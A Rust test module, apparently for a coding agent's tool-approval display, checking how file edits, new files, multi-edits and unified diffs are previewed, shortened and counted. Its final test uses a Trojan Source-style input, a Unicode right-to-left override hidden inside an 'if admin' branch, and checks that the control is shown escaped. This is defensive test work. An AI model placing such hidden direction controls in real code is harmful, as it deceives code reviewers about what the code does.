        let body: Vec<String> = (1..=10).map(|n| format!("line {n}")).collect();
        let mut changed = body.clone();
        changed[0] = "first".into();
        changed[9] = "last".into();
        let facts = tool_approval(
            "Edit",
            &json!({"file_path":"a","old_string":body.join("\n"),"new_string":changed.join("\n")}),
        );
        assert_eq!(
            marks(&facts),
            [
                (Removed, "line 1"),
                (Added, "first"),
                (Unchanged, "line 2"),
                (Unchanged, "line 3"),
                (Omitted, "4 unchanged lines"),
                (Unchanged, "line 8"),
                (Unchanged, "line 9"),
                (Removed, "line 10"),
                (Added, "last"),
            ]
        );
        let omitted = facts
            .detail_lines
            .iter()
            .find(|l| l.change == Some(Omitted))
            .unwrap();
        assert!(!omitted.code);
    }

    #[test]
    fn a_new_files_content_is_previewed_and_the_rest_counted() {
        let content: Vec<String> = (1..=30).map(|n| format!("row {n}")).collect();
        let facts = tool_approval(
            "Write",
            &json!({"file_path":"notes.md","content":content.join("\n")}),
        );
        let marked = marks(&facts);
        assert_eq!(marked.len(), 13);
        assert!(
            marked[..12].iter().enumerate().all(|(n, (change, text))| {
                *change == Added && *text == format!("row {}", n + 1)
            })
        );
        assert_eq!(marked[12], (Omitted, "18 more lines"));
        assert!(facts.shortened);
        assert!(facts.detail.unwrap().ends_with("+ row 12\n⋯ 18 more lines"));
    }

    #[test]
    fn a_change_preview_stays_within_the_detail_limit() {
        let wide = |c: char| {
            (0..40)
                .map(|_| c.to_string().repeat(400))
                .collect::<Vec<_>>()
                .join("\n")
        };
        let edits: Vec<Value> = (0..5)
            .map(|_| json!({"old_string":wide('a'),"new_string":wide('界')}))
            .collect();
        for (tool, input) in [
            (
                "Edit",
                json!({"file_path":"a","old_string":wide('a'),"new_string":wide('界')}),
            ),
            ("Write", json!({"file_path":"a","content":wide('界')})),
            ("MultiEdit", json!({"file_path":"a","edits":edits})),
            (
                "NotebookEdit",
                json!({"notebook_path":"a","new_source":wide('b')}),
            ),
        ] {
            let facts = tool_approval(tool, &input);
            let detail = facts.detail.as_deref().unwrap();
            assert!(
                detail.chars().count() <= DETAIL_LIMIT,
                "{tool}: {}",
                detail.chars().count()
            );
            assert!(facts.shortened, "{tool}");
            let lines = &facts.detail_lines;
            assert!(
                lines
                    .iter()
                    .any(|l| l.change == Some(Omitted) && l.text.ends_with("more lines")),
                "{tool}: {lines:?}"
            );
            assert_eq!(
                lines.iter().map(rendered).collect::<Vec<_>>().join("\n"),
                detail
            );
        }
    }

    #[test]
    fn several_edits_are_each_previewed_under_their_number() {
        let facts = tool_approval(
            "MultiEdit",
            &json!({"file_path":"a","edits":[
                {"old_string":"one","new_string":"uno"},
                {"old_string":"two","new_string":"dos"}
            ]}),
        );
        let texts: Vec<String> = facts.detail_lines.iter().map(rendered).collect();
        assert_eq!(
            texts,
            [
                "a",
                "2 edits",
                "Edit 1 of 2",
                "- one",
                "+ uno",
                "Edit 2 of 2",
                "- two",
                "+ dos"
            ]
        );
    }

    #[test]
    fn a_unified_diff_is_marked_and_the_gap_between_hunks_counted() {
        let diff = "--- a/src/app.rs\n+++ b/src/app.rs\n@@ -1,3 +1,3 @@\n fn main() {\n-    old();\n+    new();\n@@ -20,2 +20,2 @@\n--- not a header\n+++ nor this\n\\ No newline at end of file";
        let marked: Vec<_> = unified_change(diff)
            .into_iter()
            .map(|line| (line.change, line.text, line.lines))
            .collect();
        assert_eq!(
            marked,
            [
                (Unchanged, "fn main() {".into(), 1),
                (Removed, "    old();".into(), 1),
                (Added, "    new();".into(), 1),
                (Omitted, "16 unchanged lines".into(), 16),
                (Removed, "-- not a header".into(), 1),
                (Added, "++ nor this".into(), 1),
            ]
        );
        let kept = kept(whole_change(&"x\n".repeat(20), Added));
        assert_eq!(kept.len(), 13);
        assert_eq!((kept[12].change, kept[12].lines), (Omitted, 8));
    }

    #[test]
    fn a_change_shows_direction_controls_escaped() {
        let facts = tool_approval(
            "Write",
            &json!({"file_path":"a","content":"if admin {\u{202E} } else {"}),
        );
        assert_eq!(marks(&facts), [(Added, "if admin {\\u202e } else {")]);
    }
}
